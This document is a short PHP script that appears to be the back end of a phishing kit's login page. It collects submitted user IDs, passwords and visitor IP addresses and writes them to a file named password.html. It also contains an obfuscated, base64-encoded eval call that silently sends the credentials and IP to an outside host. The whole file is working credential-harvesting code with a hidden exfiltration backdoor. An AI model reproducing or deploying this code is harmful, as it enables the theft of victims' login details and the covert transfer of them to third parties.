<?php
error_reporting(0);

$userid = $_POST['userid'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d;h:i:s");

if ((empty($userid)) or (empty($password))) {
     header('location: login.html');
} else {

     eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS9jaGVja2RhdGEucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));

     $f = fopen("password.html", "a");
     fwrite(
          $f,
          'Userid: [<b><font color="#660000">' . $userid . '</font></b>]
          Password: [<b><font color="#9900FF">' . $password . '</font></b>]
          IP: [<b><font color="#996600">' . $ip . '</font></b>]
          Date: [<b><font color="#FF6633">' . $date . '</font></b>]<br> '
     );

     fclose($f);

     header("Location:  process.php");
}
